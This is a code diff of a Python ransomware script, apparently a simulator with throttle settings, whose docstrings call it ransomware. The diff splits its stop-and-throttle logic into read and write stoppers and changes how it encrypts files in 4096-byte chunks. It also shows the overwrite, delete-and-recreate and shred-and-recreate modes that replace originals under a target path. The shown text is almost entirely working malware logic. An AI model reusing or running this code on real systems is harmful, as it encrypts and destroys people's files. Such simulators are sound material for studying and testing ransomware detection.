@@ -63,28 +63,32 @@ class Stopper:
         self.stop = False
         self.stop_time = 0
 
-    def check_stop(self):
+    def _check_stop(self):
         """
         Check if the ransomware should stop.
+        @note : Caller should hold a lock.
         """
-        with self.lock:
-            if self.stop:
-                if time.time() - self.stop_time > self.timeout:
-                    self.stop = False
-                    self.numblk = self.numblk_std
-                    return False
-                else:
-                    return True
-            else:
+        if self.stop:
+            if time.time() - self.stop_time > self.timeout:
+                self.stop = False
+                self.numblk = self.numblk_std
                 return False
+            else:
+                return True
+        else:
+            return False
 
-    def stop_now(self):
+    def _stop_now(self):
         """
         Force the ransomware (all operations) to stop until a timeout is reached.
+        @note caller should hold a lock.
         """
-        with self.lock:
+        if not self.stop:
+            # print_red("stopped")
             self.stop = True
             self.stop_time = time.time()
+        else:
+            print_red("ERR : Stop already set")
 
     def try_stop(self, _numblk):
         """
@@ -92,11 +96,13 @@ class Stopper:
         If a stop is reached, stop now, and clear the numblk counter.
         """
         with self.lock:
-            if not self.check_stop() and _numblk <= self.numblk:
+            if not self._check_stop() and _numblk <= self.numblk:
                 self.numblk -= _numblk
-            elif not self.check_stop() and _numblk > self.numblk:
+            elif not self._check_stop() and _numblk > self.numblk:
                 self.numblk = 0
-                self.stop_now()
+                self._stop_now()
+                while self._check_stop():
+                    time.sleep(1)
 
 
 
@@ -146,7 +152,7 @@ def read_seq_threaded(tar_sys_path, queue, fname_queue, flocks, stopper,
             # Split the file contents into chunks and insert them into the ChunkSet
             loff = 0
             while loff < len(file_contents):
-                chunk = [encrypt(file_contents[loff:loff+chunk_size])]
+                chunk = encrypt(file_contents[loff:loff+chunk_size])
                 queue.put(Chunk(filepath, loff, len(chunk), chunk))
                 loff += len(chunk)
             # Mark the filename as done
@@ -304,7 +310,7 @@ def write_seq_threaded(queue, tar_sys_path, flocks, stopper,
 
     return threads
 
-def write_rand_threaded(queue, tar_sys_path, flocks, stopper,
+def write_rand_threaded(queue, tar_sys_path, flocks, stopper, 
                         num_threads = 1):
     """
     Write the encrypted chunks in chunk_set back to tar_sys_path in parallel.
@@ -352,7 +358,8 @@ def write_rand_threaded(queue, tar_sys_path, flocks, stopper,
 
 def main_overwrite():
     tar_sys_path = PATHS['injected_path']
-    stopper = Stopper(int(blknum), int(timeout))
+    rstopper = Stopper(int(blknum.split('/')[0]) * 4096, int(timeout.split('/')[0]))
+    wstopper = Stopper(int(blknum.split('/')[1]) * 4096, int(timeout.split('/')[1]))
     # file locks(flocks) are to protect against seek race conditions
     # Notice in python open will also move the file pointer, so 
     # seek, open should be protected by the same lock.
@@ -363,10 +370,10 @@ def main_overwrite():
     queue = PriorityQueue()
     fname_queue = Queue()
     if access.split('/')[0].rstrip('\n') == 'R':
-        rthreads = read_rand_threaded(tar_sys_path, queue, fname_queue, flocks,
+        rthreads = read_rand_threaded(tar_sys_path, queue, fname_queue, flocks, rstopper, 
                                         chunk_size = 4096, num_threads = Nrthreads)
     elif access.split('/')[0].rstrip('\n') == 'S':
-        rthreads = read_seq_threaded(tar_sys_path, queue, fname_queue, flocks, 
+        rthreads = read_seq_threaded(tar_sys_path, queue, fname_queue, flocks, rstopper,
                                     chunk_size = 4096, num_threads = Nrthreads)
     else:
         print("------ ERR -------")
@@ -383,9 +390,11 @@ def main_overwrite():
             t.join()
 
     if access.split('/')[1].rstrip('\n') == 'R':
-        wthreads = write_rand_threaded(queue, tar_sys_path, flocks, num_threads = Nwthreads)
+        wthreads = write_rand_threaded(queue, tar_sys_path, flocks, wstopper,
+                                       num_threads = Nwthreads)
     elif access.split('/')[1].rstrip('\n') == 'S':
-        wthreads = write_rand_threaded(queue, tar_sys_path, flocks, num_threads = Nwthreads)
+        wthreads = write_rand_threaded(queue, tar_sys_path, flocks, wstopper,
+                                       num_threads = Nwthreads)
     else:
         print("------ ERR -------")
         print("Invalid access pattern")
@@ -415,7 +424,8 @@ def main_overwrite():
     
 def main_deletecreate():
     tar_sys_path = PATHS["injected_path"]
-    stopper = Stopper(int(blknum), int(timeout))
+    rstopper = Stopper(int(blknum.split('/')[0]) * 4096, int(timeout.split('/')[0]))
+    wstopper = Stopper(int(blknum.split('/')[1]) * 4096, int(timeout.split('/')[1]))
     queue = PriorityQueue()
 
     flocks = {os.path.join(root, filename) : threading.Lock() 
@@ -425,10 +435,10 @@ def main_deletecreate():
     fname_queue = Queue()
 
     if access.split('/')[0].rstrip('\n') == 'R':
-        rthreads = read_rand_threaded(tar_sys_path, queue, fname_queue, flocks,
+        rthreads = read_rand_threaded(tar_sys_path, queue, fname_queue, flocks, rstopper, 
                                         chunk_size = 4096, num_threads = Nrthreads, rm = True)
     elif access.split('/')[0].rstrip('\n') == 'S':
-        rthreads = read_seq_threaded(tar_sys_path, queue, fname_queue, flocks, 
+        rthreads = read_seq_threaded(tar_sys_path, queue, fname_queue, flocks, rstopper,
                                     chunk_size = 4096, num_threads = Nrthreads, rm = True)
     else:
         print("------ ERR -------")
@@ -443,9 +453,11 @@ def main_deletecreate():
         for t in rthreads:
             t.join()
     if access.split('/')[1].rstrip('\n') == 'R':
-        wthreads = write_rand_threaded(queue, tar_sys_path, flocks, num_threads = Nwthreads)
+        wthreads = write_rand_threaded(queue, tar_sys_path, flocks, wstopper,
+                                       num_threads = Nwthreads)
     elif access.split('/')[1].rstrip('\n') == 'S':
-        wthreads = write_rand_threaded(queue, tar_sys_path, flocks, num_threads = Nwthreads)
+        wthreads = write_rand_threaded(queue, tar_sys_path, flocks, wstopper,
+                                       num_threads = Nwthreads)
     else:
         print("------ ERR -------")
         print("Invalid access pattern")
@@ -470,7 +482,8 @@ def main_deletecreate():
 
 def main_shredcreate():
     tar_sys_path = PATHS["injected_path"]
-    stopper = Stopper(int(blknum), int(timeout))
+    rstopper = Stopper(int(blknum.split('/')[0]) * 4096, int(timeout.split('/')[0]))
+    wstopper = Stopper(int(blknum.split('/')[1]) * 4096, int(timeout.split('/')[1]))
     queue = PriorityQueue()
 
     flocks = {os.path.join(root, filename) : threading.Lock() 
@@ -480,11 +493,11 @@ def main_shredcreate():
     fname_queue = Queue()
 
     if access.split('/')[0].rstrip('\n') == 'R':
-        rthreads = read_rand_threaded(tar_sys_path, queue, fname_queue, flocks,
+        rthreads = read_rand_threaded(tar_sys_path, queue, fname_queue, flocks, rstopper,
                                         chunk_size = 4096, num_threads = Nrthreads, 
                                         rm = True, shred = True)
     elif access.split('/')[0].rstrip('\n') == 'S':
-        rthreads = read_seq_threaded(tar_sys_path, queue, fname_queue, flocks, 
+        rthreads = read_seq_threaded(tar_sys_path, queue, fname_queue, flocks,  rstopper,
                                     chunk_size = 4096, num_threads = Nrthreads,
                                     rm = True, shred = True)
     else:
@@ -502,9 +515,11 @@ def main_shredcreate():
             t.join()
 
     if access.split('/')[1].rstrip('\n') == 'R':
-        wthreads = write_rand_threaded(queue, tar_sys_path, flocks, num_threads = Nwthreads)
+        wthreads = write_rand_threaded(queue, tar_sys_path, flocks, wstopper,
+                                       num_threads = Nwthreads)
     elif access.split('/')[1].rstrip('\n') == 'S':
-        wthreads = write_rand_threaded(queue, tar_sys_path, flocks, num_threads = Nwthreads)
+        wthreads = write_rand_threaded(queue, tar_sys_path, flocks, wstopper,
+                                       num_threads = Nwthreads)
     else:
         print("------ ERR -------")
         print("Invalid access pattern")
